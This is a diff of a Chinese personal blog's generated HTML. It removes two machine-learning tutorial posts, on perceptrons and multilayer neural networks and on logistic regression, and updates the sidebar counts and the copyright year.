-<p>接下来我们将sum函数与sgn函数合并到一个圆圈里，代表神经元的内部计算。其次，把输入a与输出z写到连接线的左上方，便于后面画复杂的网络。一个神经元可以引出多个代表输出的有向箭头，但值都是一样的。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_04.png?raw=true" alt=""></p>
-<p>在其他类型神经网络中，这里的激活函数可以有很多种形式：</p>
-<ul>
-<li>线性函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_05.png?raw=true" alt=""></p>
-<ul>
-<li>阈值函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_06.png?raw=true" alt=""></p>
-<ul>
-<li>Sigmoid函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_07.png?raw=true" alt=""></p>
-<ul>
-<li>对称Sigmoid函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_08.png?raw=true" alt=""></p>
-<ul>
-<li>双曲正切函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_09.png?raw=true" alt=""></p>
-<ul>
-<li>高斯函数</li>
-</ul>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_10.png?raw=true" alt=""></p>
-<p>神经元可以看作一个计算与存储单元。计算是神经元对其的输入进行计算功能。存储是神经元会暂存计算结果，并传递到下一层。</p>
-<p>一个神经网络的训练算法的功能就是通过大量的样本数据训练，让权重的值调整到最佳，以使得整个网络的预测效果最好。然后用来在已知所有输入值的情况下预测输出值。</p>
-<h2 id="0x03-单层神经网络-感知器"><a href="#0x03-单层神经网络-感知器" class="headerlink" title="0x03 单层神经网络(感知器)"></a>0x03 单层神经网络(感知器)</h2><p>感知器(Perceptron)由两层神经元组成的神经网络。两层分别是输入层和输出层，输入层只负责传输数据，输出层对前一层传输过来的数据进行计算。</p>
-<p>结构如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_11.png?raw=true" alt=""></p>
-<p>其中，需要计算的层次也被称为计算层，因为感知器拥有一个计算层，所以称之为“单层神经网络”。</p>
-<p>感知器中，我们把 w 称为权重向量，a 称为训练样本。</p>
-<p>感知器数据分类的算法步骤如下：</p>
-<p>把 w 初始化为 0，或者把 w 的每个分量初始化为[0, 1]之间的任意小数；<br>把训练样本 a 输入感知器，得到分类结果 z （-1或1）；<br>根据分类结果更新权重向量。</p>
-<p>权重更新算法：</p>
-<p>wj=wj+∇wj</p>
-<p>∇wj=η∗(z−z′)∗aj</p>
-<p>其中</p>
-<ul>
-<li>η 是学习率，在 [0,1] 之间。</li>
-<li>z 是输入样本的正确分类，z’ 是感知器计算出来的分类。</li>
-</ul>
-<p>假设初始w=[0,0,0],a=[1,2,3]，z=1，z’=-1时，通过算法计算：</p>
-<p>∇w0=0.3∗(1−(−1))∗x0=0.3∗2∗1=0.6</p>
-<p>w0=w0+∇w0=0.6 </p>
-<p>∇w1=0.3∗(1−(−1))∗x1=0.3∗2∗2=1.2</p>
-<p>w1=w1+∇w1=1.2</p>
-<p>∇w2=0.3∗(1−(−1))∗x2=0.3∗2∗3=1.8</p>
-<p>w2=w2+∇w2=1.8</p>
-<p>得到更新后的w=[0.6,1.2,1.8]</p>
-<p>我们在输入大量样本时，每次在答案正确时不会更改，每次在答案错误时更新权值，只要取的学习率和样本量合适，就可以得到学习之后更为精准的算法。</p>
-<p>我们可以看到，感知器类似一个逻辑回归模型，可以做线性分类任务。</p>
-<p>我们可以用决策分界来形象的表达分类的效果。决策分界就是在二维的数据平面中划出一条直线，当数据的维度是3维的时候，就是划出一个平面，当数据的维度是n维时，就是划出一个n-1维的超平面。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_12.png?raw=true" alt=""></p>
-<h2 id="0x04-两层神经网络-多层感知器"><a href="#0x04-两层神经网络-多层感知器" class="headerlink" title="0x04 两层神经网络(多层感知器)"></a>0x04 两层神经网络(多层感知器)</h2><p>两层神经网络也就是多了一层计算层(被称为隐藏层)，在增加了这一层之后，神经网络就可以解决一些复杂的问题。</p>
-<p>此时，权值矩阵增加到两个，计算层数分为隐藏层计算和输出层计算。</p>
-<p>不过不同于单层的sgn函数，在两层神经网络中，我们使用的激活函数最多的是sigmoid函数。</p>
-<p>隐藏层计算如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_13.png?raw=true" alt=""></p>
-<p>输出层计算如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_14.png?raw=true" alt=""></p>
-<p>总的计算公式：</p>
-<p>g(W(1) * a(1)) = a(2); </p>
-<p>g(W(2) * a(2)) = z;</p>
-<p>与单层神经网络不同。理论证明，两层神经网络可以无限逼近任意连续函数。也就是说，面对复杂的非线性分类任务，两层（带一个隐藏层）神经网络可以分类的很好。</p>
-<p>如下例，红色的线与蓝色的线代表数据。而红色区域和蓝色区域代表由神经网络划开的区域，两者的分界线就是决策分界。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_15.png?raw=true" alt=""></p>
-<h2 id="0x05-多层神经网络"><a href="#0x05-多层神经网络" class="headerlink" title="0x05 多层神经网络"></a>0x05 多层神经网络</h2><p>延续两层神经网络,在两层神经网络的输出层后面，继续添加层次。原来的输出层变成中间层，新加的层次成为新的输出层。我们这样依次添加，就会产生多层神经网络。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_16.png?raw=true" alt=""></p>
-<p>增加了层数，那么正向传播计算公式也会增加一步</p>
-<p>g(W(1) * a(1)) = a(2); </p>
-<p>g(W(2) * a(2)) = a(3);</p>
-<p>g(W(3) * a(3)) = z;</p>
-<p>再增加层数的话，与上面同理递推即可：</p>
-<p>g(W(1) * a(1)) = a(2); </p>
-<p>g(W(2) * a(2)) = a(3);</p>
-<p>···</p>
-<p>g(w(n-1) * a(n-1)) = a(n);</p>
-<p>g(W(n) * a(n)) = z;</p>
-<p>随着网络的层数增加，每一层对于前一层次的抽象表示更深入。代表着更深入的表示特征，以及更强的函数模拟能力。在参数数量一样的情况下，更深的网络往往具有比浅层的网络更好的识别效率。</p>
-<p>相比于单层神经网络的sgn函数和双层神经网络的sigmoid函数，到了多层神经网络时，通过一系列的研究发现，ReLU函数在训练多层神经网络时，更容易收敛，并且预测性能更好。</p>
-<p>ReLU函数不是传统的非线性函数，而是分段线性函数。其表达式非常简单，就是y=max(x,0)。简而言之，在x大于0，输出就是输入，而在x小于0时，输出就保持为0。这种函数的设计启发来自于生物神经元对于激励的线性响应，以及当低于某个阈值后就不再响应的模拟。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_17.png?raw=true" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/25/机器学习-3-——逻辑回归/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/25/机器学习-3-——逻辑回归/" itemprop="url">
-                  机器学习(3)——逻辑回归
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-25T23:39:05+08:00">
-                2018-06-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/25/机器学习-3-——逻辑回归/" class="leancloud_visitors" data-flag-title="机器学习(3)——逻辑回归">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-逻辑回归-Logistic-Regression"><a href="#0x00-逻辑回归-Logistic-Regression" class="headerlink" title="0x00 逻辑回归(Logistic Regression)"></a>0x00 逻辑回归(Logistic Regression)</h2><p>逻辑回归就是这样的一个过程：面对一个回归或者分类问题，建立代价函数，然后通过优化方法迭代求解出最优的模型参数，然后测试验证我们这个求解的模型的好坏。</p>
-<p>Logistic回归虽然名字里带“回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别）</p>
-<p>回归模型中，y是一个定性变量，比如y=0或1，logistic方法主要应用于研究某些事件发生的概率。</p>
-<h2 id="0x01-逻辑回归模型"><a href="#0x01-逻辑回归模型" class="headerlink" title="0x01 逻辑回归模型"></a>0x01 逻辑回归模型</h2><p>它的核心思想是，如果线性回归的结果输出是一个连续值，而值的范围是无法限定的，那我们有没有办法把这个结果值映射为可以帮助我们判断的结果呢。而如果输出结果是 (0,1) 的一个概率值，这个问题就很清楚了。</p>
-<p>在数学上有sigmoid函数可以帮助我们实现这一思想。</p>
-<p>sigmoid函数表达式：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_01.png?raw=true" alt=""></p>
-<p>二元逻辑回归时，将t换成ax+b，可以得到二元逻辑回归模型的参数形式：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_02.png?raw=true" alt=""></p>
-<p>sigmoid函数图形：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_03.png?raw=true" alt=""></p>
-<p>其中，如果是二元回归时，我们P(x)的值可以理解为某一分类概率的大小，如果P(x)值为0.6，代表输出为1的概率是60%，补集部分是输出为0的概率40%。</p>
-<p>此时P(x)的值越小，而分类为0的的概率越高，反之，值越大的话分类为1的的概率越高。如果靠近临界点即靠近0.6时，分类准确率会下降。</p>
-<h2 id="0x02-决策边界-decision-boundary"><a href="#0x02-决策边界-decision-boundary" class="headerlink" title="0x02 决策边界(decision boundary)"></a>0x02 决策边界(decision boundary)</h2><p>决策边界就是能够把样本正确分类的一条边界，从图像上可以直观的看到</p>
-<p>如线性决策边界：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_04.png?raw=true" alt=""></p>
-<p>非线性决策边界：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_05.png?raw=true" alt=""></p>
-<p>在上面二元逻辑回归的例子中，我们用y表示输出的离散值0或1，写为函数形式为：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_06.png?raw=true" alt=""></p>
-<p>然后我们逻辑函数g要做到，在输入大于等于零时，输出大于等于0.6；在输入小于零时，输出小于等于0.6。即：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_07.png?raw=true" alt=""></p>
-<p>决策边界是假设函数的属性，由参数决定，而不是由数据集的特征决定。</p>
-<h2 id="0x03-成本函数-Cost-Function"><a href="#0x03-成本函数-Cost-Function" class="headerlink" title="0x03 成本函数(Cost Function)"></a>0x03 成本函数(Cost Function)</h2><p>线性回归中也说过成本函数，也叫代价函数,在逻辑回归中，我们也需要定义成本函数对其取值的好坏进行评估。</p>
-<p>而逻辑回归如果取用和线性回归一样的方式计算成本函数，那么图形是“非凸”的。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_08.png?raw=true" alt=""></p>
-<p>这样就会产生很多个局部最小值，无法使用梯度下降算法。所以我们需要一个新的成本函数。</p>
-<p>在逻辑回归中，损失函数是用来估计预测值（y^(i)）与期望输出值（y(i)）之间的差异。</p>
-<p>统计学习中常用的损失函数有以下几种：</p>
-<p>(1) 0-1损失函数(0-1 loss function):</p>
-<p>(2) 平方损失函数(quadratic loss function)</p>
-<p>(3) 绝对损失函数(absolute loss function)</p>
-<p>(4) 对数损失函数(logarithmic loss function) 或对数似然损失函数(log-likelihood loss function)</p>
-<p>损失函数越小，模型就越好。</p>
-<p>所以在逻辑回归中，为了保证全局收敛，我们采用对数似然损失函数。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_09.png?raw=true" alt=""></p>
-<p>也就是说，如下两个情况：</p>
-<p>如果是正确答案为y=1的情况：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_10.png?raw=true" alt=""></p>
-<p>当y=1, 则Cost=0，也就是预测的值和真实的值完全相等的时候成本为0;但是如果y=0，Cost接近无穷大，也就是说此时成本会非常大。</p>
-<p>如果是正确答案为y=0的情况：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_11.png?raw=true" alt=""></p>
-<p>当y=0, 则Cost=0，也就是预测的值和真实的值完全相等的时候成本为0;但是如果y=1，Cost接近无穷大，也就是说此时成本会非常大。</p>
-<h2 id="0x04-简化成本函数"><a href="#0x04-简化成本函数" class="headerlink" title="0x04 简化成本函数"></a>0x04 简化成本函数</h2><p>在上面式子中，由于y 只能等于0或1，所以可以将逻辑回归中的Cost function的两个公式合并可以将我们的成本函数的两个条件案例压缩成一个案例：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_12.png?raw=true" alt=""></p>
-<p>当y等于1时，第二项（1-y）log（1- hθ（x））将为零，并且不会影响结果。如果y等于0，则所述第一术语-ylog（1-hθ（X））将为零，且不会影响结果。</p>
-<p>所以最终整个逻辑回归的成本函数如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_13.png?raw=true" alt=""></p>
-<h2 id="0x05-梯度下降"><a href="#0x05-梯度下降" class="headerlink" title="0x05 梯度下降"></a>0x05 梯度下降</h2><p>与线性回归相似，这里我们同样采用梯度下降算法来学习参数</p>
-<p>迭代函数</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_14.png?raw=true" alt=""></p>
-<p>算法就是迭代这个公式每次更新参数值，上篇已经详细说过</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_15.png?raw=true" alt=""></p>
-<h2 id="0x06-优化-Advanced-Optimization"><a href="#0x06-优化-Advanced-Optimization" class="headerlink" title="0x06 优化(Advanced Optimization)"></a>0x06 优化(Advanced Optimization)</h2><p>优化算法除了梯度下降算法外，还包括：</p>
-<ul>
-<li>Conjugate gradient method(共轭梯度法)</li>
-<li>Quasi-Newton method(拟牛顿法)</li>
-<li>BFGS method</li>
-<li>L-BFGS(Limited-memory BFGS)</li>
-</ul>
-<p>后二者由拟牛顿法引申出来，与梯度下降算法相比，这些算法的优点是：</p>
-<ul>
-<li>1.不需要手动的选择步长</li>
-<li>2.通常比梯度下降算法快</li>
-</ul>
-<p>因为算法太过复杂，我们不需要手动编写代码，只需要在库中调用相关的函数即可。</p>
-<h2 id="0x07-多分类问题-Multiclass-Classification-One-vs-all"><a href="#0x07-多分类问题-Multiclass-Classification-One-vs-all" class="headerlink" title="0x07 多分类问题(Multiclass Classification: One-vs-all)"></a>0x07 多分类问题(Multiclass Classification: One-vs-all)</h2><p>我们大多时候遇到的分类并不止两类，这个时候就产生了多分类问题。</p>
-<p>首先，二分类问题时候图形如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_16.png?raw=true" alt=""></p>
-<p>那么多分类问题的图形就如下：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_17.png?raw=true" alt=""></p>
-<p>对于多分类问题，我们可以将其先看成二分类问题，保留一类之后剩余的划作另一类。</p>
-<p>对上面的三类问题，我们需要三次划分，如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml3_18.png?raw=true" alt=""></p>
-<p>最终的One-vs-all方法：</p>
-<ul>
-<li><p>对于每一个类i训练一个逻辑回归模型的分类器，并且预测 y = i时的概率。</p>
-</li>
-<li><p>对于一个新的输入变量x,分别对每一个类进行预测，取概率最大的那个类作为分类结果。</p>
-</li>
-</ul>
-<p>也就是说，如果输入一个x，此时分类器A概率为0.3，分类器B概率为0.4，分类器C概率为0.5，那么他就属于C这个分类。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2663,7 +2504,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">115</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2685,7 +2526,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">68</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2727,7 +2568,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
